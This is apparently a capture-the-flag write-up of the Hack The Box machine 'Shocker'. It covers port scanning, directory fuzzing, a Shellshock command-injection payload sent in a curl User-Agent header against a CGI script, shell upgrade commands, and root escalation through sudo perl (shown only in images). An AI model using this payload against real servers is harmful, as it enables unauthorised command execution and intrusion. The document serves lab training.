---
title: Shocker Writeup(Easy)
published: true
---

![machine logo](/assets/shocker/logo.png)

# [](#header-2)Recognition

First of all we do a scan with nmap:

```bash
sudo nmap -sS -p- --open 10.129.50.136 -n -Pn -v
```

The nmap command reported the following ports:
*   Port 80
*   Port 2222

We do a second, more advanced scan:

```bash
sudo nmap -sCV -p80,2222 10.129.50.136
```

The scan reports the following information:

![Escaneo nmap](/assets/shocker/nmapScan.png)

We can see that the **ssh** version is vulnerable to **user enumeration(CVE-2016-6210)** and there is a **web service** running with Apache.

For the moment we are going to start with the web server.

![whatweb command](/assets/shocker/whatweb.png)

The **whatweb** command doesn't give us much information so let's visit the website.

![website](/assets/shocker/website.png)

In the website there is only one image, but after using gobuster to search other directories we found the **cgi-bin** directory.

![gobuster cgi-bin](/assets/shocker/cgi-bin.png)

Now we fuzz in this directory for any file with the extension  **cgi, sh, pl, py**.

![gobuster user.sh](/assets/shocker/usersh.png)

After some research I discovered that cgi scripts can be vulnerable to [shellsock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock) so we try to change the **User-Agent**.

# [](#header-2)Explotation

We use the following command and we can execute the command **id**, so we try to get a reverse shell.

```bash
curl -s -X GET "http://10.129.50.136/cgi-bin/user.sh" -H "User-Agent: () { :; }; echo; /usr/bin/id"
```

We use nc to get a reverse shell:

![reverse shell](/assets/shocker/reverseshell.png)

Now we use the command from [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) to get a full tty shell:

```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

We get the **user flag** from the home directory:

![user flag](/assets/shocker/userflag.png)

# [](#header-2)Privilege Escalation

Using the command **sudo -l** we can see that we can execute perl as **root**.

![sudo -l](/assets/shocker/sudo-l.png)

Using the [gtfobins](https://gtfobins.github.io/gtfobins/perl/#shell) command we can get a shell as **root**.

![privilege escalation](/assets/shocker/privesc.png)

Now that we are root we can see the root flag.

![root flag](/assets/shocker/rootflag.png)
